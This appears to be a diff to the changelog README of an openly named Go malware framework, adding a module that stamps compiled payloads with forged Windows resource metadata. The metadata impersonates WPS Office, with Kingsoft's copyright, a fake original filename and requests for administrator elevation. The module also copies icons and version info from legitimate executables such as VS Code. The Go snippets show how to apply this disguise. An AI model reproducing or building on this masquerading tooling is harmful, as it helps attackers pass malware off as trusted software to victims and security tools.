@@ -14,6 +14,93 @@ Golang Malware Framework
 
 ### 更新日志
 
+### 2024.9.26
+
+1. 新增`gores`模块，支持`自定义`文件的资源信息和`复制`其他对象资源信息（todo：ICON随机Hash）
+
+```go
+// 自定义资源信息，修改 variant/gores/render.go 中的 func NewResDate()
+// 推荐使用下面 Extract() 方法直接复制指定对象的资源信息和文件
+func NewResDate() ResDate {
+	goRes := ResDate{
+		ICOName:                           "icon.png",
+		Name:                              "WPS Office",
+		Version:                           "12.1.0.16399",
+		Description:                       "WPS Office",
+		MinimumOs:                         "win7",
+		ExecutionLevel:                    "requireAdministrator",
+		UIAccess:                          false,
+		AutoElevate:                       true,
+		DpiAwareness:                      "system",
+		DisableTheming:                    false,
+		DisableWindowFiltering:            false,
+		HighResolutionScrollingAware:      false,
+		UltraHighResolutionScrollingAware: false,
+		LongPathAware:                     false,
+		PrinterDriverIsolation:            false,
+		GDIScaling:                        false,
+		SegmentHeap:                       false,
+		UseCommonControlsV6:               false,
+		FixedFileVersion:                  "12.1.0.16399",
+		FixedProductVersion:               "WPS Office",
+		Comments:                          "",
+		CompanyName:                       "",
+		FileDescription:                   "WPS Office",
+		FileVersion:                       "12.1.0.16399",
+		InternalName:                      "",
+		LegalCopyright:                    "Copyright©2024 Kingsoft Corporation. All rights reserved.",
+		LegalTrademarks:                   "",
+		OriginalFilename:                  "wps_host.exe",
+		PrivateBuild:                      "",
+		ProductName:                       "WPS Office",
+		ProductVersion:                    "WPS Office",
+		SpecialBuild:                      "",
+	}
+
+	return goRes
+}
+
+// 渲染输出 winres.json 文件
+// 将 ICON 和 winres.json 放置在编译目录的 winres 文件夹中即可
+winres := gores.ResTmpl{
+		ResPath:   "gores/gores.tmpl",
+		OutputDir: "output",
+	}
+
+	err := winres.ResRender()
+	if err != nil {
+		panic(err)
+	}
+```
+
+2. 更新`gores`编译方法，从`build`模块中分离，新增资源提取方法`Extract()`
+
+```go
+    // 添加图标和文件信息
+	winres := gores.GoWinRes{
+		CompilePath: "output",          // 指定编译目录
+		ExtractFile: "Code.exe",        // 指定提取资源文件的对象
+		ExtractDir:  "",                // 指定提取资源文件后输出的路径
+		PatchFile:   cOpts.ExeFileName, // 指定使用 Patch 添加资源文件的对象
+	}
+
+	// 提取 vscode 所有的资源文件
+	err = winres.Extract()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// 使用 Patch 添加资源文件到编译后的程序
+	err = winres.HandleWinRes()
+	if err != nil {
+		log.Fatal(err)
+	}
+```
+
+3. 资源提取方法`Extract()`实现的效果
+
+![winres](https://raw.githubusercontent.com/C1ph3rX13/variant/main/images/winres.png)
+
 ### 2024.8.15
 
 1. 更新`render`模块，支持新增的`cloader`，模板渲染调用结构体优化
